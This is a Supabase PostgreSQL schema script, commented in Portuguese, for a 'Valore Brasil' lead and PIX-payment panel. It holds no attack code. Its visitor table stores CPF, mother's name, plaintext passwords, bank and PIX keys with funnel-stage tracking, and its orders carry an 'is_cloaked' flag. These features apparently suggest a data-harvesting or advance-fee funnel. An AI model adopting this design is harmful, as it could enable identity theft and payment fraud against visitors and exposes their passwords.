-- ====================================================================
-- VALORE BRASIL - SCHEMA COMPLETO SUPABASE (POSTGRESQL)
-- ====================================================================
-- Este script cria todas as tabelas necessárias para tornar o painel
-- e o fluxo da Valore Brasil 100% integrados e persistentes.
--
-- Como executar:
-- 1. Abra o painel do Supabase: SQL Editor do seu projeto
-- 2. Cole este código no editor SQL
-- 3. Clique em "Run" (Executar)
-- ====================================================================

-- 1. VISITANTES / LEADS
CREATE TABLE IF NOT EXISTS public.visitors (
    id TEXT PRIMARY KEY,
    cpf TEXT,
    name TEXT,
    birth_date TEXT,
    gender TEXT,
    mother_name TEXT,
    phone TEXT,
    email TEXT,
    password TEXT,
    amount NUMERIC DEFAULT 0,
    installments INTEGER DEFAULT 0,
    purpose TEXT,
    salary TEXT,
    bank TEXT,
    pix_key TEXT,
    pix_key_type TEXT,
    stage TEXT DEFAULT 'home',
    stage_index INTEGER DEFAULT 0,
    status TEXT DEFAULT 'em_andamento',
    purchased BOOLEAN DEFAULT FALSE,
    push_subscribed BOOLEAN DEFAULT FALSE,
    ip TEXT,
    browser TEXT,
    os TEXT,
    device TEXT,
    utm_source TEXT,
    utm_medium TEXT,
    utm_campaign TEXT,
    utm_term TEXT,
    utm_content TEXT,
    src TEXT,
    sck TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    last_seen_at TIMESTAMPTZ DEFAULT NOW(),
    data JSONB DEFAULT '{}'::jsonb
);

-- Índices para busca rápida no painel
CREATE INDEX IF NOT EXISTS idx_visitors_cpf ON public.visitors(cpf);
CREATE INDEX IF NOT EXISTS idx_visitors_status ON public.visitors(status);
CREATE INDEX IF NOT EXISTS idx_visitors_stage ON public.visitors(stage);
CREATE INDEX IF NOT EXISTS idx_visitors_created_at ON public.visitors(created_at DESC);

-- 2. PEDIDOS / TRANSAÇÕES PIX
CREATE TABLE IF NOT EXISTS public.orders (
    id TEXT PRIMARY KEY,
    external_id TEXT UNIQUE,
    visitor_id TEXT REFERENCES public.visitors(id) ON DELETE SET NULL,
    status TEXT DEFAULT 'PENDING',
    amount NUMERIC NOT NULL,
    total_price NUMERIC NOT NULL,
    provider TEXT DEFAULT 'nitropay',
    transaction_id TEXT,
    qr_code_text TEXT,
    qr_code_base64 TEXT,
    items JSONB DEFAULT '[]'::jsonb,
    customer JSONB DEFAULT '{}'::jsonb,
    channel TEXT DEFAULT 'standard',
    gateway_account TEXT,
    is_cloaked BOOLEAN DEFAULT FALSE,
    fee JSONB,
    paid_at TIMESTAMPTZ,
    paid_source TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW(),
    expires_at TIMESTAMPTZ,
    metadata JSONB DEFAULT '{}'::jsonb
);

CREATE INDEX IF NOT EXISTS idx_orders_status ON public.orders(status);
CREATE INDEX IF NOT EXISTS idx_orders_external_id ON public.orders(external_id);
CREATE INDEX IF NOT EXISTS idx_orders_transaction_id ON public.orders(transaction_id);
CREATE INDEX IF NOT EXISTS idx_orders_visitor_id ON public.orders(visitor_id);
CREATE INDEX IF NOT EXISTS idx_orders_created_at ON public.orders(created_at DESC);

-- 3. CONFIGURAÇÕES GERAIS DO PAINEL
CREATE TABLE IF NOT EXISTS public.app_settings (
    key TEXT PRIMARY KEY,
    value JSONB NOT NULL,
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Valores padrão iniciais (NitroPay como principal)
INSERT INTO public.app_settings (key, value)
VALUES 
    ('gateways', '{"activeGatewayId": "nitropay", "disabledGateways": ["bspay", "quantumpay"]}'::jsonb),
    ('gatewayFee', '{"fixed": 1.3, "percent": 5.99}'::jsonb)
ON CONFLICT (key) DO UPDATE SET value = EXCLUDED.value;

-- 4. INTEGRAÇÕES E CHAVES DE APIS
CREATE TABLE IF NOT EXISTS public.integrations (
    id TEXT PRIMARY KEY,
    config JSONB NOT NULL,
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Registra a NitroPay com as chaves fornecidas
-- Exemplo de registro seguro de integração no Supabase:
-- INSERT INTO public.integrations (id, config)
-- VALUES ('nitropay', '{"publicKey": "COLE_SUA_PUBLIC_KEY", "secretKey": "COLE_SUA_SECRET_KEY"}'::jsonb)
-- ON CONFLICT (id) DO UPDATE SET config = EXCLUDED.config;

-- 5. INSCRIÇÕES DE WEB PUSH
CREATE TABLE IF NOT EXISTS public.push_subscriptions (
    id TEXT PRIMARY KEY,
    endpoint TEXT UNIQUE NOT NULL,
    keys JSONB NOT NULL,
    visitor_id TEXT,
    ip TEXT,
    user_agent TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX IF NOT EXISTS idx_push_endpoint ON public.push_subscriptions(endpoint);

-- 6. AUDITORIA E SESSÕES ADMINISTRATIVAS
CREATE TABLE IF NOT EXISTS public.admin_audit (
    id BIGSERIAL PRIMARY KEY,
    action TEXT NOT NULL,
    detail TEXT NOT NULL,
    ip TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- ====================================================================
-- SEGURANÇA E RLS (ROW LEVEL SECURITY)
-- ====================================================================
-- Habilita RLS em todas as tabelas para proteger os dados contra acesso anônimo/público não autorizado.
-- O backend da aplicação acessa o Supabase via SUPABASE_SERVICE_ROLE_KEY, que possui
-- a permissão BYPASSRLS nativa do PostgreSQL, operando normalmente com segurança total.

ALTER TABLE public.visitors ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.integrations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.push_subscriptions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.admin_audit ENABLE ROW LEVEL SECURITY;
